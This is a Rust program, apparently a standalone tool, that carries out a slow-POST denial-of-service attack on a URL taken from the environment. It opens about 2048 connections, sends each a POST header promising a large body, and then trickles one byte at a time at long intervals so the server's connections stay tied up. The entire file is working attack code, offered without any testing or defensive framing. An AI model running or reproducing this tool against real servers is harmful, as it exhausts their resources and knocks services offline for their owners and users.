use std::env;
use std::io;
use std::io::Write;
use std::net::ToSocketAddrs;
use std::time::Duration;

extern crate futures;
use futures::*;

extern crate native_tls;
use native_tls::TlsConnector;

extern crate url;
use url::Url;

extern crate tokio_core;
use tokio_core::reactor::Core;
use tokio_core::net::TcpStream;

extern crate tokio_io;

extern crate tokio_timer;
use tokio_timer::*;

extern crate tokio_tls;
use tokio_tls::TlsConnectorExt;

mod stream;
use stream::MaybeHttpsStream;

type BoxedMaybeHttps = Box<Future<Item=MaybeHttpsStream, Error=std::io::Error>>;

fn main() {
    let parsed_url = Url::parse(&env::var("URL").unwrap()).unwrap();
    let needs_tls = match parsed_url.scheme() {
        "https" => true,
        _ => false
    };
    let host = parsed_url.host_str().unwrap().to_owned();
    let path = parsed_url.path();
    let default_content_length: Result<String, &str> = Ok("10000".to_owned());
    let content_length = env::var("CONTENT_LENGTH").or(default_content_length).unwrap();

    let default_timeout: Result<String, &str> = Ok("50".to_owned());
    let timeout: u64 = env::var("TIMEOUT_SEC").or(default_timeout).unwrap().parse().unwrap();
    let default_connections_count: Result<String, &str> = Ok("2048".to_owned());
    let connections_count: usize = env::var("CONNECTIONS_COUNT").or(default_connections_count).unwrap().parse().unwrap();

    let mut core = Core::new().unwrap();
    let handle = core.handle();
    let loop_handle = handle.clone();

    let start = format!("POST {} HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\nContent-Length: {}\r\n\r\n", path, host, content_length);
    let timer = Timer::default();
    let addr = parsed_url.to_socket_addrs().unwrap().next().unwrap();
    let tls_connector = TlsConnector::builder().unwrap().build().unwrap();

    let cycle = future::loop_fn(0usize, move |connection_number| {
        let timer = timer.clone();
        let host = host.clone();
        let start = start.clone();
        let tls_connector = tls_connector.clone();

        let socket = TcpStream::connect(&addr, &handle);
        let connector: BoxedMaybeHttps = if needs_tls {
            Box::new(socket.and_then(move |socket| {
                tls_connector
                    .connect_async(&host, socket)
                    .map_err(|e| { io::Error::new(io::ErrorKind::Other, format!("TLS connector error: {}", e)) })
            }).map(|stream| MaybeHttpsStream::Https(stream)))
        } else {
            Box::new(socket.map(|stream| MaybeHttpsStream::Http(stream)))
        };

        let outer_connection_number = connection_number.clone();
        let connection = connector
            .and_then(move |mut socket| {
                let _start_written = socket.write(start.as_bytes());
                let _start_flushed = socket.flush();
                println!("Stream number: {} spawned.", connection_number);
                Ok(socket)
            })
            .and_then(move |mut socket|{
                timer.interval(Duration::from_secs(timeout)).for_each(move |_| {
                    let _byte_written = socket.write(b"a");
                    let _byte_flushed = socket.flush();
                    println!("Stream number: {} written.", connection_number);
                    Ok(())
                }).map_err(|e| { io::Error::new(io::ErrorKind::Other, format!("Timer error: {}", e)) })
            });
        handle.spawn(connection.map_err(move |e| println!("Connection: {} failed! Reason: {}", outer_connection_number, e)));

        if false { return Err("What could possibly go wrong here?") };
        match connection_number <= connections_count {
            true => Ok(future::Loop::Continue(connection_number + 1)),
            false => Ok(future::Loop::Break(()))
        }
    });

    loop_handle.spawn(cycle.map_err(move |e| println!("Cannot spawn connections cycle loop. Reason: {}", e)));

    let empty: futures::Empty<(), ()> = future::empty();
    let _core_started = core.run(empty);
}